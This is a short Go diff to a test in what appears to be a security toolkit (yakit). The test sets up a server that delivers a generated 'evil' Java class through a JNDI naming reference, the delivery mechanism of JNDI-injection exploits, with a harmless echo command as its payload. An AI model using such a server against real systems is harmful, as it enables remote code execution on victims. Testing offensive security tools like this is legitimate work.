@@ -32,12 +32,13 @@ func TestFacadeServer(t *testing.T) {
 	className := "test"
 	//cmd := "echo 1 > /tmp/1.txt"
 	s := NewFacadeServer(ip, 60010)
+	c, _ := yso.GenerateRuntimeExecEvilClassObject("echo 1 > /tmp/1.txt")
 	s.Config(
 		SetJavaClassName("yakit_exec"),
 		SetJavaCodeBase(s.GetAddr()),
 		SetjavaFactory(className),
 		SetObjectClass("javaNamingReference"),
-		SetHttpResource(fmt.Sprintf("%s.class", className), yso.GenExecClass(className, "echo 1 > /tmp/1.txt")),
+		SetHttpResource(fmt.Sprintf("%s.class", className), c.Bytes()),
 	)
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
